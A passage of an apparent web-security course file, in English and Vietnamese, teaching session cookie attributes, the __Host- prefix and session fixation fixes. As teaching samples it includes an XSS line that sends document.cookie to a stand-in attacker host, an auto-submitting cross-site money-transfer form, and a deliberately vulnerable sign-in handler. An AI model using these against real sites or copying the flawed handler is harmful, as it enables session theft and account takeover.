<pre><code>Set-Cookie: phien=…;                      <span class="tok-comment">// host-only: CHỈ vidu.com</span>
Set-Cookie: phien=…; Domain=vidu.com      <span class="tok-comment">// vidu.com VÀ mọi tên miền con</span></code></pre>
<div class="out">Voi Domain=vidu.com, cookie phien duoc gui toi:
  vidu.com            ✅ y dinh
  app.vidu.com        ✅ y dinh
  blog.vidu.com       ← WordPress cu, plugin loi thoi
  status.vidu.com     ← trang trang thai do ben thu ba chay
  cu.vidu.com         ← tro toi mot IP khong con ai so huu

# Mot lo XSS o blog, hoac mot cu chiem ten mien con o "cu",
# la doc duoc cookie phien cua toan bo san pham chinh.</div>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Omit <code>Domain</code> by default</span><span class="lz-lnote">Leaving it out makes the cookie host-only: it goes to exactly the host that set it and nowhere else. This is both the safest option and the one you get for free by not typing anything.</span></div>
  <div class="lz-layer"><span class="lz-lname">Subdomain takeover is a real class of bug</span><span class="lz-lnote">A <code>CNAME</code> pointing at a deleted Heroku app or an unclaimed S3 bucket lets anyone register that name and serve content from <code>cu.vidu.com</code>. With a domain-wide cookie, that is instant session theft across your whole product.</span></div>
  <div class="lz-layer"><span class="lz-lname">If you genuinely need sharing, isolate the rest</span><span class="lz-lnote">A real single-sign-on across <code>app.</code> and <code>api.</code> may need it. Then put everything untrusted — the blog, the docs, user-generated content — on a completely different registrable domain, not on a subdomain.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>Path</code> is not a security boundary</span><span class="lz-lnote"><code>Path=/admin</code> looks like isolation and is not: any page on the origin can read a <code>Path</code>-scoped cookie by creating an iframe at that path, and the same-origin policy does not separate paths. Use <code>Path=/</code> and rely on the other attributes.</span></div>
</div>

<h3><code>__Host-</code> — three rules the browser enforces for you</h3>
<pre><code>Set-Cookie: __Host-phien=…; Path=/; Secure; HttpOnly; SameSite=Lax   <span class="tok-comment">// ✅ nhận</span>
Set-Cookie: __Host-phien=…; Path=/; HttpOnly                          <span class="tok-comment">// ❌ bỏ: thiếu Secure</span>
Set-Cookie: __Host-phien=…; Path=/admin; Secure                       <span class="tok-comment">// ❌ bỏ: Path phải là /</span>
Set-Cookie: __Host-phien=…; Path=/; Secure; Domain=vidu.com           <span class="tok-comment">// ❌ bỏ: có Domain</span></code></pre>
<div class="callout ok">
<p><strong>The <code>__Host-</code> prefix is the highest-value single change in this lesson.</strong> A cookie whose name starts with it is rejected by the browser unless it has <code>Secure</code>, has <code>Path=/</code>, and has no <code>Domain</code>. That means a misconfiguration cannot silently ship — it fails loudly in development instead. It also blocks <em>cookie tossing</em>, where a compromised subdomain sets a cookie of the same name to overwrite yours, because a subdomain cannot write a <code>__Host-</code> cookie at all.</p>
</div>

<h3>Clearing a cookie, and the trap</h3>
<pre><code><span class="tok-comment">// ❌ Không xoá được gì cả</span>
res.clearCookie('__Host-phien');

<span class="tok-comment">// ✅ Phải khớp CHÍNH XÁC path, domain, secure và sameSite lúc đặt</span>
res.clearCookie('__Host-phien', {
  path: '/', secure: true, httpOnly: true, sameSite: 'lax',
});</code></pre>
<div class="out"># Trinh duyet dinh danh mot cookie bang (ten, domain, path).
# Sai bat ky phan nao la ban dat mot cookie MOI da het han
# ben canh cai cu — con cai cu thi van nam do va van duoc gui di.

# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang phien
# trong co so du lieu, neu khong thi ke cap van dung tiep binh thuong.</div>
<div class="note-ct">
<p><strong>The complete set, for a normal application.</strong> Name it <code>__Host-phien</code> · <code>HttpOnly</code> · <code>Secure</code> · <code>SameSite=Lax</code> · <code>Path=/</code> · no <code>Domain</code> · <code>Max-Age</code> matching the session's absolute expiry · and <code>app.set('trust proxy', 1)</code> so <code>Secure</code> works behind Nginx. Six attributes, one line of Express configuration, and every one of them has a specific attack behind it. Write it once in a helper and never set a session cookie by hand again.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">MDN — Set-Cookie</span><span class="lc-sub">developer.mozilla.org · Every attribute, with browser support tables</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc6265bis" target="_blank" rel="noopener"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">RFC 6265bis — cookies</span><span class="lc-sub">datatracker.ietf.org · The prefix rules and SameSite semantics, normatively</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies" target="_blank" rel="noopener"><span class="lc-ico">🛡️</span><span class="lc-body"><span class="lc-title">OWASP — session cookie attributes</span><span class="lc-sub">cheatsheetseries.owasp.org · The recommended combination and why</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#cookie_prefixes" target="_blank" rel="noopener"><span class="lc-ico">🔒</span><span class="lc-body"><span class="lc-title">MDN — cookie prefixes</span><span class="lc-sub">developer.mozilla.org · __Host- and __Secure-, and what each enforces</span></span></a>
<a class="link-card" href="/courses/web-foundations/learn${REF}"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">CuongThai course — Web foundations</span><span class="lc-sub">Origins, sites and the same-origin policy these attributes build on</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Steal a cookie with and without HttpOnly, then submit a cross-site form with each SameSite value</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.2</span>
<h2>Từng thuộc tính cookie, và nó THẬT SỰ chặn được gì</h2>
<p class="lead">Độ an toàn của một cookie phiên nằm TRỌN trong các thuộc tính của nó, và mỗi thuộc tính chặn một cú tấn công CỤ THỂ trong khi để yên những cú khác. Bài này đi qua từng cái một, kèm mối đe doạ mà nó nhắm tới, rồi kết bằng một cái TIỀN TỐ duy nhất cưỡng chế ba thuộc tính cùng lúc.</p>

<h3>Cái header, có chú giải</h3>
<pre><code>Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
            └───┬───┘ └──┬──┘      └─┬──┘ └───┬──┘  └─┬──┘ └──────┬─────┘  └──────┬──────┘
          tiền tố  giá trị       phạm vi   script  chỉ    ngữ cảnh chéo    tuổi thọ
          bắt buộc               đường dẫn không   HTTPS   trang
          3 luật                          đọc được</code></pre>
<pre><code><span class="tok-comment">// Express: đặt tất cả trong MỘT chỗ, đừng rải rác</span>
res.cookie('__Host-phien', token, {
  httpOnly: true,
  secure:   true,
  sameSite: 'lax',
  path:     '/',
  maxAge:   30 * 24 * 60 * 60 * 1000,
  <span class="tok-comment">// domain: KHÔNG đặt — xem phần Domain bên dưới</span>
});</code></pre>

<h3><code>HttpOnly</code> — script KHÔNG đọc được nó</h3>
<pre><code><span class="tok-comment">// Với HttpOnly, đoạn XSS này không lấy được gì</span>
fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
<div class="out">// Khong co HttpOnly:
"__Host-phien=Kc9x2Lm…; theme=dark"     ← ca phien di ra ngoai

// Co HttpOnly:
"theme=dark"                              ← chi con cookie khong nhay cam</div>
<div class="pitfall">
<p><strong>Bẫy — <code>HttpOnly</code> chặn việc token bị <em>ĐỌC</em>; nó KHÔNG chặn việc token bị <em>DÙNG</em>.</strong> Một script của kẻ tấn công đang chạy trên trang của bạn vẫn gọi được <code>fetch('/api/change-email', {method:'POST', credentials:'include', …})</code> và trình duyệt TỰ ĐỘNG đính cookie vào. Cái phiên không bị cắp, nhưng kẻ tấn công HÀNH ĐỘNG với tư cách người dùng trong suốt thời gian script còn chạy. <code>HttpOnly</code> biến một cú chiếm tài khoản VĨNH VIỄN thành một bài toán dài bằng một phiên — một cải thiện lớn, và KHÔNG phải cách vá cho XSS.</p>
</div>

<h3><code>Secure</code> — chỉ HTTPS, kèm một ngoại lệ hữu ích</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Nó làm gì</span><span class="v">Trình duyệt TỪ CHỐI gửi cookie qua <code>http://</code> trần. Không có nó, chỉ một liên kết tới <code>http://vidu.com</code> — một lần gõ nhầm, một bookmark cũ, một cái email — là phiên đi ra dạng RÕ tới bất kỳ ai nằm trên đường mạng.</span></div>
  <div class="kv"><span class="k">Ngoại lệ localhost</span><span class="v">Trình duyệt hiện đại coi <code>http://localhost</code> là một origin đáng tin, nên cookie <code>Secure</code> vẫn chạy khi phát triển tại máy. Bạn KHÔNG cần một cái cờ điều kiện, và thêm nó vào chính là cách <code>secure: false</code> chui lên production.</span></div>
  <div class="kv"><span class="k">Sau một proxy thì phải đặt <code>trust proxy</code></span><span class="v">Express quyết định <code>req.secure</code> từ <code>X-Forwarded-Proto</code>, thứ nó LỜ ĐI trừ khi có <code>app.set('trust proxy', 1)</code>. Không có nó, một bản triển khai HTTPS hoàn toàn đúng đằng sau Nginx vẫn có thể tin rằng mình đang chạy HTTP.</span></div>
  <div class="kv"><span class="k">Thêm cả HSTS nữa</span><span class="v"><code>Strict-Transport-Security: max-age=63072000; includeSubDomains</code> làm trình duyệt từ chối HTTP trần tới tên miền của bạn HOÀN TOÀN, nên cú hạ cấp mà cờ <code>Secure</code> phòng thủ thậm chí không có cơ hội bắt đầu.</span></div>
</div>

<h3><code>SameSite</code> — lớp phòng CSRF dựng sẵn trong trình duyệt</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Strict</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">KHÔNG BAO GIỜ gửi xuyên trang</span><span class="lz-nsub">Kể cả khi bấm một liên kết từ trang khác — nên người dùng tới nơi ở trạng thái đăng xuất</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Lax — mặc định</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Gửi khi điều hướng GET ở cấp cao nhất</span><span class="lz-nsub">Không gửi với POST xuyên trang, iframe, ảnh hay fetch</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">None</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">LUÔN gửi</span><span class="lz-nsub">Bắt buộc kèm Secure. Chỉ dành cho một sản phẩm xuyên trang THẬT SỰ</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// Kẻ tấn công đặt cái này trên trang của họ</span>
&lt;form action="https://vidu.com/api/chuyen-tien" method="POST"&gt;
  &lt;input name="den" value="ke-tan-cong"&gt;&lt;input name="so-tien" value="10000000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<div class="out">SameSite=Lax  → cookie KHONG duoc gui (POST xuyen trang) → 401 ✅
SameSite=None → cookie DUOC gui → chuyen tien thanh cong ❌
Khong dat     → Chrome mac dinh Lax; Safari va cac trinh duyet khac
                khac nhau tuy phien ban → DUNG dua vao mac dinh</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Chọn <code>Lax</code> cho cookie phiên</span><span class="v">Nó chặn cú POST xuyên trang ở trên trong khi vẫn để một người bấm liên kết tới trang bạn đến nơi ở trạng thái ĐÃ đăng nhập. Chính tổ hợp đó làm nó thành mặc định đúng cho gần như mọi ứng dụng.</span></div>
  <div class="kv"><span class="k"><code>Strict</code> có một cái giá trải nghiệm THẬT</span><span class="v">Một người bấm liên kết từ email hay từ kết quả tìm kiếm sẽ tới nơi ở trạng thái ĐĂNG XUẤT, và điều đó bị đọc như một con bug. Mẫu phổ biến là một cookie <code>Strict</code> cho các hành động giá trị cao đặt cạnh một cookie <code>Lax</code> cho danh tính — đáng với ngân hàng, thừa thãi với phần lớn thứ khác.</span></div>
  <div class="kv"><span class="k"><code>None</code> nghĩa là bài toán CSRF thuộc về BẠN</span><span class="v">Một widget nhúng được hay một SPA nằm ở origin khác thì cần nó. Khoảnh khắc bạn đặt nó, trình duyệt NGỪNG giúp và lớp phòng bằng token của Bài 3.4 thành BẮT BUỘC chứ không còn là phòng thủ nhiều lớp.</span></div>
  <div class="kv"><span class="k">"Cùng site" KHÔNG phải "cùng origin"</span><span class="v">Site nghĩa là tên miền đăng ký được: <code>app.vidu.com</code> và <code>blog.vidu.com</code> là CÙNG <em>site</em> và KHÁC <em>origin</em>. Vì thế <code>SameSite</code> chẳng làm gì giữa các tên miền con của chính bạn — điều đó quan trọng với thuộc tính tiếp theo.</span></div>
</div>

<h3><code>Domain</code> — cái thuộc tính nên BỎ TRỐNG</h3>
<pre><code>Set-Cookie: phien=…;                      <span class="tok-comment">// chỉ-host: CHỈ vidu.com</span>
Set-Cookie: phien=…; Domain=vidu.com      <span class="tok-comment">// vidu.com VÀ mọi tên miền con</span></code></pre>
<div class="out">Voi Domain=vidu.com, cookie phien duoc gui toi:
  vidu.com            ✅ y dinh
  app.vidu.com        ✅ y dinh
  blog.vidu.com       ← WordPress cu, plugin loi thoi
  status.vidu.com     ← trang trang thai do ben thu ba chay
  cu.vidu.com         ← tro toi mot IP khong con ai so huu

# Mot lo XSS o blog, hoac mot cu chiem ten mien con o "cu",
# la doc duoc cookie phien cua toan bo san pham chinh.</div>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Mặc định là BỎ <code>Domain</code></span><span class="lz-lnote">Không ghi nó thì cookie thành CHỈ-HOST: nó chỉ đi tới đúng cái host đã đặt nó và không đi đâu khác. Đây vừa là lựa chọn an toàn nhất vừa là lựa chọn bạn có MIỄN PHÍ bằng cách không gõ gì cả.</span></div>
  <div class="lz-layer"><span class="lz-lname">Chiếm tên miền con là một LỚP bug có thật</span><span class="lz-lnote">Một bản ghi <code>CNAME</code> trỏ tới một app Heroku đã xoá hoặc một bucket S3 chưa ai nhận cho phép bất kỳ ai đăng ký cái tên đó và phục vụ nội dung từ <code>cu.vidu.com</code>. Với một cookie phủ cả tên miền, đó là cú cắp phiên TỨC THÌ trên toàn bộ sản phẩm của bạn.</span></div>
  <div class="lz-layer"><span class="lz-lname">Nếu THẬT SỰ cần chia sẻ thì hãy cô lập phần còn lại</span><span class="lz-lnote">Một hệ đăng nhập một lần thật sự trải trên <code>app.</code> và <code>api.</code> thì có thể cần nó. Khi đó hãy đặt MỌI thứ không đáng tin — blog, tài liệu, nội dung người dùng tạo — trên một tên miền đăng ký HOÀN TOÀN KHÁC, đừng đặt ở một tên miền con.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>Path</code> KHÔNG phải một ranh giới bảo mật</span><span class="lz-lnote"><code>Path=/admin</code> trông như cô lập mà không phải: bất kỳ trang nào trên cùng origin đều đọc được một cookie giới hạn theo <code>Path</code> bằng cách tạo một iframe ở đường dẫn đó, và chính sách cùng-origin KHÔNG tách theo đường dẫn. Hãy dùng <code>Path=/</code> và dựa vào những thuộc tính khác.</span></div>
</div>

<h3><code>__Host-</code> — ba luật do TRÌNH DUYỆT cưỡng chế giùm bạn</h3>
<pre><code>Set-Cookie: __Host-phien=…; Path=/; Secure; HttpOnly; SameSite=Lax   <span class="tok-comment">// ✅ nhận</span>
Set-Cookie: __Host-phien=…; Path=/; HttpOnly                          <span class="tok-comment">// ❌ bỏ: thiếu Secure</span>
Set-Cookie: __Host-phien=…; Path=/admin; Secure                       <span class="tok-comment">// ❌ bỏ: Path phải là /</span>
Set-Cookie: __Host-phien=…; Path=/; Secure; Domain=vidu.com           <span class="tok-comment">// ❌ bỏ: có Domain</span></code></pre>
<div class="callout ok">
<p><strong>Tiền tố <code>__Host-</code> là thay đổi ĐƠN LẺ có giá trị cao nhất trong bài này.</strong> Một cookie có tên bắt đầu bằng nó sẽ bị TRÌNH DUYỆT từ chối trừ khi nó có <code>Secure</code>, có <code>Path=/</code>, và KHÔNG có <code>Domain</code>. Nghĩa là một cấu hình sai KHÔNG thể lặng lẽ lên production — nó hỏng ỒN ÀO ngay lúc phát triển. Nó cũng chặn được <em>cookie tossing</em>, khi một tên miền con bị chiếm đặt một cookie CÙNG TÊN để đè lên cookie của bạn, bởi vì một tên miền con hoàn toàn KHÔNG ghi được một cookie <code>__Host-</code>.</p>
</div>

<h3>Xoá một cookie, và cái bẫy</h3>
<pre><code><span class="tok-comment">// ❌ Không xoá được gì cả</span>
res.clearCookie('__Host-phien');

<span class="tok-comment">// ✅ Phải khớp CHÍNH XÁC path, domain, secure và sameSite lúc đặt</span>
res.clearCookie('__Host-phien', {
  path: '/', secure: true, httpOnly: true, sameSite: 'lax',
});</code></pre>
<div class="out"># Trinh duyet dinh danh mot cookie bang (ten, domain, path).
# Sai bat ky phan nao la ban dat mot cookie MOI da het han
# ben canh cai cu — con cai cu thi van nam do va van duoc gui di.

# Va du sao: xoa cookie KHONG phai dang xuat. Phai THU HOI hang phien
# trong co so du lieu, neu khong thi ke cap van dung tiep binh thuong.</div>
<div class="note-ct">
<p><strong>Bộ đầy đủ, cho một ứng dụng bình thường.</strong> Đặt tên là <code>__Host-phien</code> · <code>HttpOnly</code> · <code>Secure</code> · <code>SameSite=Lax</code> · <code>Path=/</code> · KHÔNG có <code>Domain</code> · <code>Max-Age</code> khớp với hết-hạn-tuyệt-đối của phiên · và <code>app.set('trust proxy', 1)</code> để <code>Secure</code> chạy đúng sau Nginx. Sáu thuộc tính, một dòng cấu hình Express, và MỖI cái đều có một cú tấn công cụ thể đứng sau. Hãy viết nó MỘT lần trong một hàm phụ rồi đừng bao giờ đặt cookie phiên bằng tay nữa.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">MDN — Set-Cookie</span><span class="lc-sub">developer.mozilla.org · Mọi thuộc tính, kèm bảng hỗ trợ trình duyệt</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc6265bis" target="_blank" rel="noopener"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">RFC 6265bis — cookie</span><span class="lc-sub">datatracker.ietf.org · Luật tiền tố và ngữ nghĩa SameSite, theo chuẩn</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies" target="_blank" rel="noopener"><span class="lc-ico">🛡️</span><span class="lc-body"><span class="lc-title">OWASP — thuộc tính cookie phiên</span><span class="lc-sub">cheatsheetseries.owasp.org · Tổ hợp được khuyến nghị và lý do</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#cookie_prefixes" target="_blank" rel="noopener"><span class="lc-ico">🔒</span><span class="lc-body"><span class="lc-title">MDN — tiền tố cookie</span><span class="lc-sub">developer.mozilla.org · __Host- và __Secure-, và mỗi cái cưỡng chế điều gì</span></span></a>
<a class="link-card" href="/courses/web-foundations/learn${REF}"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Nền tảng Lập trình Web</span><span class="lc-sub">Origin, site và chính sách cùng-origin mà những thuộc tính này dựng lên trên</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Cắp một cookie có và không có HttpOnly, rồi gửi một form xuyên trang với từng giá trị SameSite</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 3.3 ─────────────────────────── */
    {
      title: '3.3 — New session on every privilege change|||3.3 — Phiên MỚI ở mỗi lần đổi mức đặc quyền',
      slug: 'auth-3-3-tai-sinh-phien',
      type: 'LESSON',
      description: 'Session fixation là cú tấn công mà kẻ tấn công CHO bạn mượn mã phiên của họ rồi chờ bạn đăng nhập vào đó. Cách vá là một dòng — cấp phiên MỚI, đừng nâng cấp phiên cũ tại chỗ — và cùng cái luật đó áp cho đổi mật khẩu, đăng ký MFA, và mọi lần đổi vai trò. Kèm cả xác thực lại theo bậc.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.3</span>
<h2>New session on every privilege change</h2>
<p class="lead">Most authentication bugs are about a credential being stolen. Session fixation is the inverse: the attacker <em>gives</em> the victim a session id, waits for them to log in with it, and inherits an authenticated session without ever seeing a password. The fix is one line, and the rule it comes from covers several other situations that are easy to miss.</p>

<h3>The attack</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">1 · Plant</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Attacker fixes a session id</span><span class="lz-nsub">A value they know, set in the victim's browser</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">2 · Wait</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Victim logs in normally</span><span class="lz-nsub">Correct password, correct MFA — nothing looks wrong</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">3 · Inherit</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">The same id is now authenticated</span><span class="lz-nsub">And the attacker has been holding it all along</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// ❌ The vulnerable pattern: reuse the id, just attach a user to it</span>
app.post('/sign-in', async (req, res) =&gt; {
  const nd = await kiemTraMatKhau(req.body);
  await prisma.phien.update({
    where: { id: req.phien.id },              <span class="tok-comment">// ← CÙNG mã phiên</span>
    data:  { nguoiDungId: nd.id },            <span class="tok-comment">// ← chỉ gắn thêm người dùng</span>
  });
  res.json({ ok: true });
});</code></pre>
<div class="out"># Ke tan cong da cam ma phien do TU TRUOC khi nan nhan dang nhap.
# Bay gio no tro thanh mot phien DA XAC THUC, va ho van dang cam.
# Mat khau dung, MFA dung, va tai khoan van bi chiem.</div>

<h3>How the id gets planted</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Cookie tossing from a subdomain</span><span class="v">A compromised or unclaimed <code>cu.vidu.com</code> can set a cookie named <code>phien</code> for the parent domain. Lesson 3.2's <code>__Host-</code> prefix blocks this specifically, because a subdomain cannot write a <code>__Host-</code> cookie.</span></div>
  <div class="kv"><span class="k">A session id in the URL</span><span class="v">Old frameworks accepted <code>?PHPSESSID=…</code> or <code>;jsessionid=…</code> so that cookieless browsers worked. A link is then all it takes. Never read a session token from a query parameter — cookies or the <code>Authorization</code> header, nothing else.</span></div>
  <div class="kv"><span class="k">XSS anywhere on the origin</span><span class="v">If a script can run, it can set <code>document.cookie</code>. <code>HttpOnly</code> prevents reading but not writing a <em>different</em> cookie name — and a same-name write is what the <code>__Host-</code> prefix stops.</span></div>
  <div class="kv"><span class="k">A shared or public machine</span><span class="v">The lowest-tech version: log in on a library computer, do not log out, and the next person has your session. Idle expiry from Lesson 3.1 bounds it; regeneration does not help here, but revocation does.</span></div>
</div>

<h3>The fix</h3>
<pre><code><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
app.post('/sign-in', async (req, res) =&gt; {
  const nd = await kiemTraMatKhau(req.body);

  if (req.phien) {
    await prisma.phien.update({
      where: { id: req.phien.id }, data: { thuHoiLuc: new Date() },
    });
  }
  const token = await taoPhien(nd.id, req);      <span class="tok-comment">// mã HOÀN TOÀN mới</span>
  datCookiePhien(res, token);

  res.json({ ok: true });
});</code></pre>
<div class="out">Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000

# Ma ke tan cong dang cam gio da bi thu hoi va tro nen vo dung.
# Nan nhan cam mot ma moi ma ke tan cong chua bao gio thay.</div>
<div class="callout ok">
<p><strong>The rule, stated once: never raise the privilege of an existing session — replace it.</strong> Any moment at which "what this session can do" increases is a moment for a new session id. That is not only login: it is completing MFA, changing a password, an admin assuming another user's identity, and accepting an invitation that grants a role. If the answer to "could an attacker have known this id before the privilege increased?" is anything but a certain no, rotate.</p>
</div>

<h3>Where else it applies</h3>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">After MFA</span><span class="lz-t">The second factor raises privilege</span><span class="lz-d">A pre-MFA session that can only reach <code>/mfa</code> becomes a fully authenticated one. That is a privilege increase, so it gets a new id — and the pre-MFA session should be revoked rather than upgraded.</span></div>
  <div class="lz-step"><span class="lz-k">After a password change</span><span class="lz-t">And revoke the others</span><span class="lz-d">Lesson 2.3's requirement: issue a new session for the current browser, revoke every other session for that user. This is what makes "change your password" a meaningful response to a suspected compromise.</span></div>
  <div class="lz-step"><span class="lz-k">On role change</span><span class="lz-t">Especially downward</span><span class="lz-d">Promoting a user to admin should rotate; <em>demoting</em> one must, and must also revoke their existing sessions — otherwise the removed admin keeps their access until the session expires on its own.</span></div>
  <div class="lz-step"><span class="lz-k">On impersonation</span><span class="lz-t">Both directions</span><span class="lz-d">"View as user" in an admin tool creates a different identity. Give it its own session with an explicit marker, and rotate again on the way back. A shared id between the admin and the impersonated user is a confusing audit log at best.</span></div>
</div>

<h3>Carrying anonymous state across</h3>
<pre><code><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
app.post('/sign-in', async (req, res) =&gt; {
  const gioCu = req.phien?.id;                    <span class="tok-comment">// giữ lại id CŨ để đọc dữ liệu</span>
  const nd = await kiemTraMatKhau(req.body);

  await prisma.$transaction(async (tx) =&gt; {
    if (gioCu) {
      await tx.gioHang.updateMany({
        where: { phienId: gioCu }, data: { nguoiDungId: nd.id, phienId: null },
      });
      await tx.phien.update({ where: { id: gioCu }, data: { thuHoiLuc: new Date() } });
    }
  });

  datCookiePhien(res, await taoPhien(nd.id, req));
});</code></pre>
<div class="pitfall">
<p><strong>Trap — an anonymous session that survives login is the vulnerability wearing a feature's clothes.</strong> "Keep the cart" is a real requirement, and the wrong implementation of it — keeping the session id so the cart stays attached — is exactly the fixation bug. Move the <em>rows</em> to the user, revoke the old session, issue a new one. The user sees their cart; the attacker's planted id is dead.</p>
</div>

<h3>Step-up: proving it is still you</h3>
<pre><code><span class="tok-comment">// Một cột nữa trên Phien, và một middleware</span>
model Phien {
  <span class="tok-comment">// …</span>
  xacThucLuc DateTime   <span class="tok-comment">// lần cuối người dùng CHỨNG MINH danh tính</span>
}

export function canXacThucLai(phutToiDa: number) {
  return (req, res, next) =&gt; {
    const tuoi = Date.now() - req.phien.xacThucLuc.getTime();
    if (tuoi &gt; phutToiDa * 60_000) {
      return res.status(403).json({ ma: 'CAN_XAC_THUC_LAI', phutToiDa });
    }
    next();
  };
}

app.post('/account/change-email',  requireAuth, canXacThucLai(5), doiEmail);
app.post('/account/delete',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
app.post('/thanh-toan/rut-tien',  requireAuth, canXacThucLai(2), rutTien);</code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">It defends against the stolen session, not the stolen password</span><span class="lz-lnote">An attacker with a hijacked cookie can read everything, but cannot change the email or delete the account without producing the password. That is the gap between "session compromised" and "account lost", and it is worth building.</span></div>
  <div class="lz-layer"><span class="lz-lname">Which actions need it</span><span class="lz-lnote">Anything that changes how the account is recovered — email, phone, password, MFA devices, recovery codes — plus anything irreversible or financial. Not "everything sensitive": too many prompts and users stop reading them.</span></div>
  <div class="lz-layer"><span class="lz-lname">Update <code>xacThucLuc</code>, do not rotate</span><span class="lz-lnote">Re-authentication confirms the existing session rather than raising its privilege, so the id stays. Set <code>xacThucLuc = now()</code> on success. Rotation is for privilege <em>increase</em>; this is privilege <em>confirmation</em>.</span></div>
  <div class="lz-layer"><span class="lz-lname">This is OIDC's <code>auth_time</code> and <code>max_age</code></span><span class="lz-lnote">The same idea is standardised: an identity provider reports when the user actually authenticated, and a relying party can demand a fresh one. Chapter 8 uses it; the mechanism here is the local version of the same requirement.</span></div>
</div>
<div class="note-ct">
<p><strong>Three lines that close most of this.</strong> Use the <code>__Host-</code> prefix so a subdomain cannot plant a cookie · never read a session token from a URL · and on login, revoke the old session and issue a new one instead of updating the existing row. Session fixation has been a known attack since the 1990s and it keeps reappearing, almost always because "update the session with the user id" is the shortest code that makes the login work.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://owasp.org/www-community/attacks/Session_fixation" target="_blank" rel="noopener"><span class="lc-ico">📌</span><span class="lc-body"><span class="lc-title">OWASP — session fixation</span><span class="lc-sub">owasp.org · The attack, its variants, and the regeneration requirement</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change" target="_blank" rel="noopener"><span class="lc-ico">🔄</span><span class="lc-body"><span class="lc-title">OWASP — renew after privilege change</span><span class="lc-sub">cheatsheetseries.owasp.org · The full list of moments that require a new id</span></span></a>
<a class="link-card" href="https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest" target="_blank" rel="noopener"><span class="lc-ico">⏱️</span><span class="lc-body"><span class="lc-title">OIDC — max_age and auth_time</span><span class="lc-sub">openid.net · Step-up authentication, standardised across parties</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🔐</span><span class="lc-body"><span class="lc-title">OWASP — MFA cheat sheet</span><span class="lc-sub">cheatsheetseries.owasp.org · Where a second factor belongs in the flow</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Fix a session against a victim, watch it become authenticated, then add the four-line fix</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.3</span>
